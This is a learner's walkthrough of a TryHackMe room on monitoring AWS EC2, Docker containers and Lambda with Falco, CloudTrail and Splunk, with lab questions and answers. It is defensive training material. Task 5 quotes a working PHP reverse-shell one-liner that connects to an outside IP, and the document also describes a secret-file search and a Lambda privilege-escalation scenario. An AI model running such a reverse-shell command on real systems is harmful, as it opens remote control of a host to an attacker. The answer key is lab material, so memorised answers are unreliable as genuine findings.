---
icon: aws
cover: >-
  https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1768862182319
coverY: 0
coverHeight: 138
---

# Monitoring AWS Workloads

**Date:** 10.04.2026

**Room Category:** Walkthrough

**Core Concept:** Monitoring various AWS compute workloads: EC2, Docker Containers, and Lambda functions, using runtime security tools like Falco and control-plane auditing via CloudTrail.

Running code in the cloud isn't just about virtual machines anymore. Modern environments use a mix of auto-scaling EC2 instances, sandboxed containers, and serverless functions. Each of these introduces unique blind spots. This room explores how to use Falco for deep runtime visibility and Splunk to catch attackers pivoting through AWS management services.

***

### Task 1: Introduction

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt="" width="188"><figcaption></figcaption></figure>

AWS workloads range from traditional virtual machines (EC2) to modern serverless architectures. While they all run code, the way we monitor them changes drastically depending on the underlying infrastructure. We will look at how tools like Falco and services like SSM affect our detection strategy.

Question: Let's begin!

> **Answer:** No answer needed

***

### Task 2: Monitoring EC2

The most common attack surface in AWS is still the EC2 instance. Beyond standard SSH access, AWS provides management services like **Systems Manager (SSM)** and **Auto Scaling** that, while useful, can be abused by attackers as a built-in Command and Control (C2) framework.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Key Detection Points:

* **SSM RunCommand:** Logs as `SendCommand` in CloudTrail. Attackers use this to execute scripts without needing SSH credentials.
* **Session Manager:** Logs as `StartSession`. It bypasses `auth.log` since it doesn't use standard SSH/RDP ports.
* **Auto Scaling:** Creates challenges for EDR/SIEM agents due to the short lifespan of instances.

Question: Which CloudTrail events can you use to track SSM commands and sessions?

> **Answer:** SendCommand, StartSession

Question: Which AWS service adjusts the right number of EC2 instances to match demand?

> **Answer:** Amazon EC2 Auto Scaling

***

### Task 3: Falco for EC2

Traditional tools like `auditd` are often too noisy or lack context. **Falco** is an open-source runtime security tool that provides a modern alternative. It can log low-level syscalls or generate high-level alerts enriched with metadata like container names or parent processes.

#### Analytical Practice (Splunk index=task3):

By renaming fields like `output_fields.*` to standard process names, we can track exactly what happened on the `ec2-demo` host.

Question: Investigate the low-level Falco events coming from ec2-demo. When was Morgan Blake's local password changed?

> **Answer:** 2026-01-14 23:44:19

Question: What GitHub repository name did Morgan clone to the VM?

> **Answer:** react-boilerplate

Question: Now switch to the high-level alerts coming from srv-prodgw. What rule has triggered the alert you see?

> **Answer:** Search Private Keys or Passwords

***

### Task 4: Monitoring Containers

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="128"><figcaption></figcaption></figure>

Containers like Docker add a layer of abstraction. Monitoring them means observing both the **Host** (EC2) and the **Sandboxed** environment. If you only look at the host via `ps`, the PIDs won't match the internal container PIDs, making correlation difficult without a container-aware tool.

Question: Does an EC2 instance have access to the events of its containers? (Yea/Nay)

> **Answer:** Yea

Question: Is Initial Access to containers similar to that of plain EC2? (Yea/Nay)

> **Answer:** Yea

***

### Task 5: Falco for Containers

Falco shines in container environments because it maps system calls back to specific container IDs, names, and images. This allows analysts to distinguish between activity on a production web server and a database container living on the same host.

#### Investigative Workflow:

1. **Identify Suspicious Process:** `find / -name *secret*`
2. **Check Parent:** `apache2` (indicates a potential web shell).
3. **Enrich with Container Context:** Falco identifies the image as `wordpress:php8.2-apache`.

Question: Which two containers are visible in Falco logs?

> **Answer:** thm-db, thm-web

Question: What container image does the web container use?

> **Answer:** thm/website:latest

Question: What is the absolute path to the Apache web server?

> **Answer:** /usr/sbin/apache2

Question: What was the first Discovery command executed through the web?

> **Answer:** whoami

Question: What command line allowed the attacker to open a reverse shell?

> **Answer:** php -r '$sock=fsockopen("115.190.98.228",9999);exec("bash <&3 >&3 2>&3");'

***

### Task 6: AWS Lambda Theory

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

AWS Lambda is "serverless" compute. There is no OS for us to install an agent on, so monitoring relies almost entirely on **CloudTrail** and function-level logging. Attackers target Lambda for credential theft, persistence via malicious layers, and privilege escalation.

Question: What role was assigned to the function during its creation?

> **Answer:** img-processor-role-ztpjz457

Question: What is the function's codeSha256 after the change in its code?

> **Answer:** JM6U2MB9wb7p738MMZzcISed6lXCRm0GNHS0eK0UpZQ=

Question: Soon after, the role of the function has been changed. What is the name of the new execution role?

> **Answer:** ImageProcessorRole

Question: Lastly, the function has been made publicly accessible. What CloudTrail event confirms this misconfiguration?

> **Answer:** AddPermission20150331v2

***

### Task 7: AWS Lambda Practice

This scenario demonstrates a **Privilege Escalation** attack. An attacker with low-level permissions on a developer account modifies the code of a high-privileged Lambda function (`thm-deployer`). Because the function has `EC2FullAccess`, the attacker uses it to spin up malicious infrastructure.

Question: What user and access key interacted with the Lambda service?

> **Answer:** carl.brown, AKIAVZZK4G6EZH7GIZY3

Question: The attacker overwrote the Lambda code with the malicious one. What is the size of the uploaded Python code?

> **Answer:** 1837

Question: The malicious code started two EC2 instances. What are their instance IDs? (Ascending, via comma)

> **Answer:** i-054e705408f5fa5de, i-056219235e66e3f94

Question: The code was updated again to install cryptominers on EC2 via SSM. What SSM "documentName" did the attacker use to install malware?

> **Answer:** AWS-RunShellScript

***

### Conclusion

I have to be honest: this room was a serious challenge. Moving from basic CloudTrail logs to investigating Falco syscalls and tracking Lambda code updates felt like a massive step up in difficulty. I definitely struggled with mapping the container IDs back to the original attack surface at first.

However, after spending the past few days working on AWS and Splunk, I'm really starting to get used to the AWS ecosystem. There's a certain logic to how events like `SendCommand` or `UpdateFunctionCode` tell a story of an attacker's movement. It was tough, but finally catching that malicious cryptominer deployment felt like a huge win. I'm feeling much more confident about monitoring complex cloud workloads now.
